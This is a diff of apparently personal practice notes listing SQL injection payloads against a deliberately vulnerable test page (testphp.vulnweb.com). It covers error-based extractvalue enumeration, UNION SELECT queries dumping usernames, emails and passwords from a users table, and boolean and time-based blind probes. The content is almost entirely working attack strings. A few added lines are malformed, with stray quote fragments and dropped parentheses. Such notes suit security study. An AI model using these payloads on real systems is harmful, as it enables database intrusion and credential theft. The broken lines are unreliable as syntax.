@@ -1,31 +1,35 @@
-1.Error-based SQL injection（报错型注入）
-2.UNION query SQL injection（可联合查询注入）
-3.Boolean-based blind SQL injection（布尔型注入）
+1.Error-based SQL injection（报错型注入
+2.UNION query SQL injection（可联合查询注入
+3.Boolean-based blind SQL injection（布尔型注入
 
 ========================================================================================================
-1.Error-based SQL injection（报错型注入）
+*** 1.Error-based SQL injection（报错型注入）***
 cat=1%27
 cat=1+and+extractvalue(1,'^x')
 cat=1+and+extractvalue(1,concat(':',database()))
 cat=1+and+extractvalue(1,concat(':',(select+group_concat(table_name)+from+information_schema.tables)))
 cat=1+and+extractvalue(1,concat(':',length((select+group_concat(table_name)+from+information_schema.tables))))
 cat=1+and+extractvalue(1,concat(':',length((select+group_concat(table_name)+from+information_schema.tables+where+table_schema+=+database()))))
+cat=1+and+extractvalue(1,concat(':',substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema+=+database()),1,31)))
+cat=1+and+extractvalue(1,concat(':',length((select+group_concat(column_name)+from+information_schema.columns+where+table_name+=+'users'))))
+cat=1+and+extractvalue(1,concat(':',substr((select+group_concat(column_name)+from+information_schema.columns+where+table_name+=+'users'),1,31)))
 
 ========================================================================================================
 *** 2.UNION query SQL injection（可联合查询注入）***
 http://testphp.vulnweb.com/listproducts.php?cat=1
 cat=1+order+by+11
 cat=-1+union+select+1,18107397,3,4,5,6,7,8,9,10,11
-cat=-1+union+select+1,18107397,3,4,5,6,7,8,9,10,group_concat(table_name)%20from%20information_schema.tables
-cat=-1+union+select+1,18107397,3,4,5,6,7,8,9,10,group_concat(table_name)%20from%20information_schema.tables
-cat=-1+union+select+1,18107397,3,4,5,6,7,8,9,10,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%20=%20database()
-cat=-1+union+select+1,18107397,3,4,5,6,7,8,9,10,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name%20=%20%27users%27
-cat=-1+union+select+1,18107397,3,4,5,6,7,8,9,10,group_concat(uname,0x3a,email,0x3a,pass)%20from%20users
+cat=-1+union+select+1,18107397,3,4,5,6,7,8,9,10,group_concat(table_name)+from+information_schema.tables
+cat=-1+union+select+1,18107397,3,4,5,6,7,8,9,10,group_concat(table_name)+from+information_schema.tables
+cat=-1+union+select+1,18107397,3,4,5,6,7,8,9,10,group_concat(table_name)+from+information_schema.tables+where+table_schema+=+database()
+cat=-1+union+select+1,18107397,3,4,5,6,7,8,9,10,group_concat(column_name)+from+information_schema.columns+where+table_name+=+'users'%27'
+cat=-1+union+select+1,18107397,3,4,5,6,7,8,9,10,group_concat(uname,0x3a,email,0x3a,pass)+from+users
 
-cat=1%20and%20(SELECT%20pass%20from%20users%20where%20uname=%27test%27)=%27test%27
-cat=1%20and%20substr((SELECT%20pass%20from%20users%20where%20uname=%27test%27),1,1)=%27t%27
+cat=1+and+(SELECT+pass+from+users+where+uname='test')='test'%27'
+cat=1+and+substr((SELECT+pass+from+users+where+uname='test'),1,1)='t'
+
 ========================================================================================================
-3.Boolean-based blind SQL injection（布尔型注入）
+*** 3.Boolean-based blind SQL injection（布尔型注入）***
 http://testphp.vulnweb.com/listproducts.php?cat=1
 sleep(5)
 case when true then sleep(1) else sleep(2) end
